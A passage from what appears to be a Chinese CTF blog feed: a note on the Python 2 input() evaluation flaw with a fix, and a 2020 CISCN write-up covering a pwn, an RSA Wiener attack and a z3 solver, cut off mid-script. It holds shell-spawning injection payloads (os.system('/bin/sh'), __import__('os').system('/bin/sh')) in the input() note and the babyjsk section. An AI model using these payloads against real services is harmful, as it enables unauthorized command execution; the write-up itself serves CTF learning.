class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="input-产生漏洞原因"><a href="#input-产生漏洞原因" class="headerlink" title="input() 产生漏洞原因"></a>input() 产生漏洞原因</h2><p>函数会将 stdin 输入的内容当做是 python2 代码去执行，看两个例子：</p><ol><li><p>```python<br>a = raw_input()<br>b = input()<br>print “raw_input:”+a<br>print “input:”+b<br>‘’’<br>$ python 1.py<br>3+2<br>3+2<br>raw_input:%d 3+2<br>input:%d 5<br>‘’’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   input 输入的内容被当做是 python 代码去执行了。</span><br><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;python</span><br><span class="line">   #!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">   # -*- coding: utf-8 -*-</span><br><span class="line">   ans &#x3D; 10</span><br><span class="line">   a &#x3D; raw_input()</span><br><span class="line">   if a &#x3D;&#x3D; ans:</span><br><span class="line">   print &quot;raw_input&quot;</span><br><span class="line">   b &#x3D; input()</span><br><span class="line">   if b &#x3D;&#x3D; ans:</span><br><span class="line">   print &quot;input&quot;</span><br><span class="line">   &#39;&#39;&#39;</span><br><span class="line">   $ python 1.py</span><br><span class="line">   ans</span><br><span class="line">   ans</span><br><span class="line">   input</span><br><span class="line">   &#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>input 输入 ans 直接读取了 ans 的值到 b 当中，实际效果等同于<code>b = ans</code>。在这里也知道了为什么用 input() 输入字符串时，要加上引号，如果我们不加上，很可能被当做是<strong>变量名</strong>，结果就如同例子 2 。</p></li></ol><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul><li>如果 python 脚本本身就有引入 os 库，输入 payload 直接 getshell：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>如果 python 脚本没有引入 os 库，payload 如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>python2 中避免使用 input() 函数，使用 raw_input() 代替，如果需要 int 可以这样：<code>int(raw_input())</code> 。</p><p>python3 中 input() 输入默认转换为字符型，raw_input() 被去除。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.51cto.com/12332766/2299894">Python中input()函数漏洞及与raw_input（）函数区别</a></li><li><a href="http://www.prog61.com/2020/03/29/input%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9Epython/">input()函数中的漏洞– Python 2.x</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 CISCN Writeup</title>
      <link href="archives/205/"/>
      <url>archives/205/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="babyjsk"><a href="#babyjsk" class="headerlink" title="babyjsk"></a>babyjsk</h2><p>解压后在众多文件夹中的找到 <code>server.py</code> 。内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2中input()函数漏洞</span></span><br><span class="line">size = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">assert</span>(size &lt; <span class="number">1024</span>*<span class="number">1024</span>) <span class="comment">#1MB max</span></span><br><span class="line">script = sys.stdin.read(size) <span class="comment"># reads one byte at a time, similar to getchar()</span></span><br><span class="line"></span><br><span class="line">temp = tempfile.mktemp()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(temp, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(script)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.environ[&#x27;LD_PRELOAD&#x27;] = &quot;./libJavaScriptCore.so.1&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;LD_PRELOAD=/home/ctf/libJavaScriptCore.so.1 /home/ctf/jsc &quot;</span> + temp</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.mrskye.cn/archives/187">Python2中input()函数漏洞笔记</a></p></blockquote><p>脚本引入了 os 库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h2><p>仅知道 n e c ，但是 e 非常大，正常都是 65535 ，判断是低解密指数攻击。用现成轮子：<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d-<span class="number">1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=-<span class="number">1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">n1=<span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">c=<span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">e=<span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">d=decode(e,n1)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+]&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(m)</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>这题其实跟逆向关系不大，会用z3库就解出来了，相当于去解一个46元一次方程组，人手算肯定算到天亮，那么用z3这个解方程库一下自就可以跑出来了</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>z3 库的使用另外开了<a href="https://www.mrskye.cn/archives/185/">笔记</a>记录，简单记录这个脚本思路。首先变量类型不一定要 BitVec ，可以是 Int ， 因为解出来的值必须是整数，不然怎么从 ascii 转成可见字符串；然后是 89 行开始的约束是限制结尾在 ascii 可见字符范围内，测试后发现不添加这部分也是可以解出来的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">de = [<span class="number">0x4F17</span>,<span class="number">0x9CF6</span>,<span class="number">0x8DDB</span>,<span class="number">0x8EA6</span>,<span class="number">0x6929</span>,<span class="number">0x9911</span>,<span class="number">0x40A2</span>,<span class="number">0x2F3E</span>,<span class="number">0x62B6</span>,<span class="number">0x4B82</span>,<span class="number">0x486C</span>,<span class="number">0x4002</span>,<span class="number">0x52D7</span>,<span class="number">0x2DEF</span>,<span class="number">0x28DC</span>,<span class="number">0x640D</span>,<span class="number">0x528F</span>,<span class="number">0x613B</span>,<span class="number">0x4781</span>,<span class="number">0x6B17</span>,<span class="number">0x3237</span>,<span class="number">0x2A93</span>,<span class="number">0x615F</span>,<span class="number">0x50BE</span>,<span class="number">0x598E</span>,<span class="number">0x4656</span>,<span class="number">0x5B31</span>,<span class="number">0x313A</span>,<span class="number">0x3010</span>,<span class="number">0x67FE</span>,<span class="number">0x4D5F</span>,<span class="number">0x58DB</span>,<span class="number">0x3799</span>,<span class="number">0x60A0</span>,<span class="number">0x2750</span>,<span class="number">0x3759</span>,<span class="number">0x8953</span>,<span class="number">0x7122</span>,<span class="number">0x81F9</span>,<span class="number">0x5524</span>,<span class="number">0x8971</span>,<span class="number">0x3A1D</span>]</span><br><span class="line">v46=BitVec(<span class="string">&#x27;v46&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v47=BitVec(<span class="string">&#x27;v47&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v48=BitVec(<span class="string">&#x27;v48&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v49=BitVec(<span class="string">&#x27;v49&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v50=BitVec(<span class="string">&#x27;v50&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v51=BitVec(<span class="string">&#x27;v51&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v52=BitVec(<span class="string">&#x27;v52&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v53=BitVec(<span class="string">&#x27;v53&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v54=BitVec(<span class="string">&#x27;v54&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v55=BitVec(<span class="string">&#x27;v55&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v56=BitVec(<span class="string">&#x27;v56&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v57=BitVec(<span class="string">&#x27;v57&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v58=BitVec(<span class="string">&#x27;v58&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v59=BitVec(<span class="string">&#x27;v59&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v60=BitVec(<span class="string">&#x27;v60&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v61=BitVec(<span class="string">&#x27;v61&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v62=BitVec(<span class="string">&#x27;v62&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v63=BitVec(<span class="string">&#x27;v63&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v64=BitVec(<span class="string">&#x27;v64&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v65=BitVec(<span class="string">&#x27;v65&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v66=BitVec(<span class="string">&#x27;v66&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v67=BitVec(<span class="string">&#x27;v67&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v68=BitVec(<span class="string">&#x27;v68&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v69=BitVec(<span class="string">&#x27;v69&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v70=BitVec(<span class="string">&#x27;v70&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v71=BitVec(<span class="string">&#x27;v71&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v72=BitVec(<span class="string">&#x27;v72&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v73=BitVec(<span class="string">&#x27;v73&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v74=BitVec(<span class="string">&#x27;v74&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v75=BitVec(<span class="string">&#x27;v75&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v76=BitVec(<span class="string">&#x27;v76&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v77=BitVec(<span class="string">&#x27;v77&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v78=BitVec(<span class="string">&#x27;v78&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v79=BitVec(<span class="string">&#x27;v79&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v80=BitVec(<span class="string">&#x27;v80&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v81=BitVec(<span class="string">&#x27;v81&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v82=BitVec(<span class="string">&#x27;v82&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v83=BitVec(<span class="string">&#x27;v83&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v84=BitVec(<span class="string">&#x27;v84&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v85=BitVec(<span class="string">&#x27;v85&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v86=BitVec(<span class="string">&#x27;v86&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v87=BitVec(<span class="string">&#x27;v87&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v4=de[<span class="number">0</span>]</span><br><span class="line">v5=de[<span class="number">1</span>]</span><br><span class="line">v6=de[<span class="number">2</span>]</span><br><span class="line">v7=de[<span class="number">3</span>]</span><br><span class="line">v8=de[<span class="number">4</span>]</span><br><span class="line">v9=de[<span class="number">5</span>]</span><br><span class="line">v10=de[<span class="number">6</span>]</span><br><span class="line">v11=de[<span class="number">7</span>]</span><br><span class="line">v12=de[<span class="number">8</span>]</span><br><span class="line">v13=de[<span class="number">9</span>]</span><br><span class="line">v14=de[<span class="number">10</span>]</span><br><span class="line">v15=de[<span class="number">11</span>]</span><br><span class="line">v16=de[<span class="number">12</span>]</span><br><span class="line">v17=de[<span class="number">13</span>]</span><br><span class="line">v18=de[<span class="number">14</span>]</span><br><span class="line">v19=de[<span class="number">15</span>]</span><br><span class="line">v20=de[<span class="number">16</span>]</span><br><span class="line">v21=de[<span class="number">17</span>]</span><br><span class="line">v22=de[<span class="number">18</span>]</span><br><span class="line">v23=de[<span class="number">19</span>]</span><br><span class="line">v24=de[<span class="number">20</span>]</span><br><span class="line">v25=de[<span class="number">21</span>]</span><br><span class="line">v26=de[<span class="number">22</span>]</span><br><span class="line">v27=de[<span class="number">23</span>]</span><br><span class="line">v28=de[<span class="number">24</span>]</span><br><span class="line">v29=de[<span class="number">25</span>]</span><br><span class="line">v30=de[<span class="number">26</span>]</span><br><span class="line">v31=de[<span class="number">27</span>]</span><br><span class="line">v32=de[<span class="number">28</span>]</span><br><span class="line">v33=de[<span class="number">29</span>]</span><br><span class="line">v34=de[<span class="number">30</span>]</span><br><span class="line">v35=de[<span class="number">31</span>]</span><br><span class="line">v36=de[<span class="number">32</span>]</span><br><span class="line">v37=de[<span class="number">33</span>]</span><br><span class="line">v38=de[<span class="number">34</span>]</span><br><span class="line">v39=de[<span class="number">35</span>]</span><br><span class="line">v40=de[<span class="number">36</span>]</span><br><span class="line">v41=de[<span class="number">37</span>]</span><br><span class="line">v42=de[<span class="number">38</span>]</span><br><span class="line">v43=de[<span class="number">39</span>]</span><br><span class="line">v44=de[<span class="number">40</span>]</span><br><span class="line">v45=de[<span class="number">41</span>]</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(v4 == <span class="number">34</span> * v49 + <span class="number">12</span> * v46 + <span class="number">53</span> * v47 + <span class="number">6</span> * v48 + <span class="number">58</span> * v50 + <span class="number">36</span> * v51 + v52)</span><br><span class="line">s.add(v5 == <span class="number">27</span> * v50 + <span class="number">73</span> * v49 + <span class="number">12</span> * v48 + <span class="number">83</span> * v46 + <span class="number">85</span> * v47 + <span class="number">96</span> * v51 + <span class="number">52</span> * v52)</span><br><span class="line">s.add(v6 == <span class="number">24</span> * v48 + <span class="number">78</span> * v46 + <span class="number">53</span> * v47 + <span class="number">36</span> * v49 + <span class="number">86</span> * v50 + <span class="number">25</span> * v51 + <span class="number">46</span> * v52)</span><br><span class="line">s.add(v7 == <span class="number">78</span> * v47 + <span class="number">39</span> * v46 + <span class="number">52</span> * v48 + <span class="number">9</span> * v49 + <span class="number">62</span> * v50 + <span class="number">37</span> * v51 + <span class="number">84</span> * v52)</span><br><span class="line">s.add(v8 == <span class="number">48</span> * v50 + <span class="number">14</span> * v48 + <span class="number">23</span> * v46 + <span class="number">6</span> * v47 + <span class="number">74</span> * v49 + <span class="number">12</span> * v51 + <span class="number">83</span> * v52)</span><br><span class="line">s.add(v9 == <span class="number">15</span> * v51 + <span class="number">48</span> * v50 + <span class="number">92</span> * v48 + <span class="number">85</span> * v47 + <span class="number">27</span> * v46 + <span class="number">42</span> * v49 + <span class="number">72</span> * v52)</span><br><span class="line">s.add(v10 == <span class="number">26</span> * v51 + <span class="number">67</span> * v49 + <span class="number">6</span> * v47 + <span class="number">4</span> * v46 + <span class="number">3</span> * v48 + <span class="number">68</span> * v52)</span><br><span class="line">s.add(v11 == <span class="number">34</span> * v56 + <span class="number">12</span> * v53 + <span class="number">53</span> * v54 + <span class="number">6</span> * v55 + <span class="number">58</span> * v57 + <span class="number">36</span> * v58 + v59)</span><br><span class="line">s.add(v12 == <span class="number">27</span> * v57 + <span class="number">73</span> * v56 + <span class="number">12</span> * v55 + <span class="number">83</span> * v53 + <span class="number">85</span> * v54 + <span class="number">96</span> * v58 + <span class="number">52</span> * v59)</span><br><span class="line">s.add(v13 == <span class="number">24</span> * v55 + <span class="number">78</span> * v53 + <span class="number">53</span> * v54 + <span class="number">36</span> * v56 + <span class="number">86</span> * v57 + <span class="number">25</span> * v58 + <span class="number">46</span> * v59)</span><br><span class="line">s.add(v14 == <span class="number">78</span> * v54 + <span class="number">39</span> * v53 + <span class="number">52</span> * v55 + <span class="number">9</span> * v56 + <span class="number">62</span> * v57 + <span class="number">37</span> * v58 + <span class="number">84</span> * v59)</span><br><span class="line">s.add(v15 == <span class="number">48</span> * v57 + <span class="number">14</span> * v55 + <span class="number">23</span> * v53 + <span class="number">6</span> * v54 + <span class="number">74</span> * v56 + <span class="number">12</span> * v58 + <span class="number">83</span> * v59)</span><br><span class="line">s.add(v16 == <span class="number">15</span> * v58 + <span class="number">48</span> * v57 + <span class="number">92</span> * v55 + <span class="number">85</span> * v54 + <span class="number">27</span> * v53 + <span class="number">42</span> * v56 + <span class="number">72</span> * v59)</span><br><span class="line">s.add(v17 == <span class="number">26</span> * v58 + <span class="number">67</span> * v56 + <span class="number">6</span> * v54 + <span class="number">4</span> * v53 + <span class="number">3</span> * v55 + <span class="number">68</span> * v59)</span><br><span class="line">s.add(v18 == <span class="number">34</span> * v63 + <span class="number">12</span> * v60 + <span class="number">53</span> * v61 + <span class="number">6</span> * v62 + <span class="number">58</span> * v64 + <span class="number">36</span> * v65 + v66)</span><br><span class="line">s.add(v19 == <span class="number">27</span> * v64 + <span class="number">73</span> * v63 + <span class="number">12</span> * v62 + <span class="number">83</span> * v60 + <span class="number">85</span> * v61 + <span class="number">96</span> * v65 + <span class="number">52</span> * v66)</span><br><span class="line">s.add(v20 == <span class="number">24</span> * v62 + <span class="number">78</span> * v60 + <span class="number">53</span> * v61 + <span class="number">36</span> * v63 + <span class="number">86</span> * v64 + <span class="number">25</span> * v65 + <span class="number">46</span> * v66)</span><br><span class="line">s.add(v21 == <span class="number">78</span> * v61 + <span class="number">39</span> * v60 + <span class="number">52</span> * v62 + <span class="number">9</span> * v63 + <span class="number">62</span> * v64 + <span class="number">37</span> * v65 + <span class="number">84</span> * v66)</span><br><span class="line">s.add(v22 == <span class="number">48</span> * v64 + <span class="number">14</span> * v62 + <span class="number">23</span> * v60 + <span class="number">6</span> * v61 + <span class="number">74</span> * v63 + <span class="number">12</span> * v65 + <span class="number">83</span> * v66)</span><br><span class="line">s.add(v23 == <span class="number">15</span> * v65 + <span class="number">48</span> * v64 + <span class="number">92</span> * v62 + <span class="number">85</span> * v61 + <span class="number">27</span> * v60 + <span class="number">42</span> * v63 + <span class="number">72</span> * v66)</span><br><span class="line">s.add(v24 == <span class="number">26</span> * v65 + <span class="number">67</span> * v63 + <span class="number">6</span> * v61 + <span class="number">4</span> * v60 + <span class="number">3</span> * v62 + <span class="number">68</span> * v66)</span><br><span class="line">s.add(v25 == <span class="number">34</span> * v70 + <span class="number">12</span> * v67 + <span class="number">53</span> * v68 + <span class="number">6</span> * v69 + <span class="number">58</span> * v71 + <span class="number">36</span> * v72 + v73)</span><br><span class="line">s.add(v26 == <span class="number">27</span> * v71 + <span class="number">73</span> * v70 + <span class="number">12</span> * v69 + <span class="number">83</span> * v67 + <span class="number">85</span> * v68 + <span class="number">96</span> * v72 + <span class="number">52</span> * v73)</span><br><span class="line">s.add(v27 == <span class="number">24</span> * v69 + <span class="number">78</span> * v67 + <span class="number">53</span> * v68 + <span class="number">36</span> * v70 + <span class="number">86</span> * v71 + <span class="number">25</span> * v72 + <span class="number">46</span> * v73)</span><br><span class="line">s.add(v28 == <span class="number">78</span> * v68 + <span class="number">39</span> * v67 + <span class="number">52</span> * v69 + <span class="number">9</span> * v70 + <span class="number">62</span> * v71 + <span class="number">37</span> * v72 + <span class="number">84</span> * v73)</span><br><span class="line">s.add(v29 == <span class="number">48</span> * v71 + <span class="number">14</span> * v69 + <span class="number">23</span> * v67 + <span class="number">6</span> * v68 + <span class="number">74</span> * v70 + <span class="number">12</span> * v72 + <span class="number">83</span> * v73)</span><br><span class="line">s.add(v30 == <span class="number">15</span> * v72 + <span class="number">48</span> * v71 + <span class="number">92</span> * v69 + <span class="number">85</span> * v68 + <span class="number">27</span> * v67 + <span class="number">42</span> * v70 + <span class="number">72</span> * v73)</span><br><span class="line">s.add(v31 == <span class="number">26</span> * v72 + <span class="number">67</span> * v70 + <span class="number">6</span> * v68 + <span class="number">4</span> * v67 + <span class="number">3</span> * v69 + <span class="number">68</span> * v73)</span><br><span class="line">s.add(v32 == <span class="number">34</span> * v77 + <span class="number">12</span> * v74 + <span class="number">53</span> * v75 + <span class="number">6</span> * v76 + <span class="number">58</span> * v78 + <span class="number">36</span> * v79 + v80)</span><br><span class="line">s.add(v33 == <span class="number">27</span> * v78 + <span class="number">73</span> * v77 + <span class="number">12</span> * v76 + <span class="number">83</span> * v74 + <span class="number">85</span> * v75 + <span class="number">96</span> * v79 + <span class="number">52</span> * v80)</span><br><span class="line">s.add(v34 == <span class="number">24</span> * v76 + <span class="number">78</span> * v74 + <span class="number">53</span> * v75 + <span class="number">36</span> * v77 + <span class="number">86</span> * v78 + <span class="number">25</span> * v79 + <span class="number">46</span> * v80)</span><br><span class="line">s.add(v35 == <span class="number">78</span> * v75 + <span class="number">39</span> * v74 + <span class="number">52</span> * v76 + <span class="number">9</span> * v77 + <span class="number">62</span> * v78 + <span class="number">37</span> * v79 + <span class="number">84</span> * v80)</span><br><span class="line">s.add(v36 == <span class="number">48</span> * v78 + <span class="number">14</span> * v76 + <span class="number">23</span> * v74 + <span class="number">6</span> * v75 + <span class="number">74</span> * v77 + <span class="number">12</span> * v79 + <span class="number">83</span> * v80)</span><br><span class="line">s.add(v37 == <span class="number">15</span> * v79 + <span class="number">48</span> * v78 + <span class="number">92</span> * v76 + <span class="number">85</span> * v75 + <span class="number">27</span> * v74 + <span class="number">42</span> * v77 + <span class="number">72</span> * v80)</span><br><span class="line">s.add(v38 == <span class="number">26</span> * v79 + <span class="number">67</span> * v77 + <span class="number">6</span> * v75 + <span class="number">4</span> * v74 + <span class="number">3</span> * v76 + <span class="number">68</span> * v80)</span><br><span class="line">s.add(v39 == <span class="number">34</span> * v84 + <span class="number">12</span> * v81 + <span class="number">53</span> * v82 + <span class="number">6</span> * v83 + <span class="number">58</span> * v85 + <span class="number">36</span> * v86 + v87)</span><br><span class="line">s.add(v40 == <span class="number">27</span> * v85 + <span class="number">73</span> * v84 + <span class="number">12</span> * v83 + <span class="number">83</span> * v81 + <span class="number">85</span> * v82 + <span class="number">96</span> * v86 + <span class="number">52</span> * v87)</span><br><span class="line">s.add(v41 == <span class="number">24</span> * v83 + <span class="number">78</span> * v81 + <span 